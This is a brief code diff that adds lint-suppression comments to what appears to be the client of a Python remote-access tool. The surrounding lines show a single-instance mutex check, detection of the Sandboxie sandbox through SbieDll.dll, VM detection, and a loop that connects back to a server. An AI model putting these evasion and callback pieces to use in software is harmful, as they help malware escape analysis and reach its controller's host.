@@ -50,10 +50,10 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 def detect_sandboxie():
     try:
         # Extract the sandboxie dll file to ckeck if it exists
-        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
+        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll") # noqa
         return " (Sandboxie) "
 
-    except: return ""
+    except: return "" # noqa
 
 
 # Step 5: Define a Function to Detect VM
@@ -71,7 +71,7 @@ def detectVM():
 
 # Step 6: Define a Function to Connect Client to the Server
 def server_connect():
-    global objSocket
+    global objSocket # noqa
 
     while True:
         # Try to Create a Socket Connection and Connect to Server
